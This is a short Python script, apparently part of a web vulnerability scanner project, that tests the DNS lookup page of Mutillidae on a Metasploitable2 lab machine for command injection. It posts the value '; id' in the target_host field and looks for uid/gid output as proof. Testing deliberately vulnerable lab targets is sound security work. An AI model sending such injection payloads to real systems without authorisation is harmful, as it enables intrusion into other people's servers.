"""Quick verification: POST form enhancement on Metasploitable2 Mutillidae"""
import sys
import io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
sys.path.insert(0, "C:/Users/HZR/.qclaw/workspace-agent-b7ed571b/wvs-v18")

import asyncio
import aiohttp

async def test_mutillidae_cmdi():
    """Test Mutillidae DNS lookup with full POST params"""
    url = "http://192.168.18.131/mutillidae/index.php"
    
    # POST with all hidden fields preserved
    data = {
        "page": "dns-lookup.php",
        "title": "DNS Lookup",
        "target_host": "; id"
    }
    
    print(f"Testing: POST {url}")
    print(f"Data: {data}")
    
    async with aiohttp.ClientSession() as session:
        async with session.post(url, data=data, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            content = await resp.text()
            print(f"Status: {resp.status}")
            print(f"Response length: {len(content)}")
            
            # Check for command output
            if "uid=" in content and "gid=" in content:
                print("VULNERABLE: Command injection confirmed!")
                # Find the uid line
                import re
                m = re.search(r"uid=\d+\([^)]+\).*?gid=\d+\([^)]+\)", content)
                if m:
                    print(f"Evidence: {m.group(0)}")
                return True
            else:
                print("No CMDi evidence found")
                return False

if __name__ == "__main__":
    result = asyncio.run(test_mutillidae_cmdi())
    print(f"\nResult: {'CONFIRMED' if result else 'NOT FOUND'}")
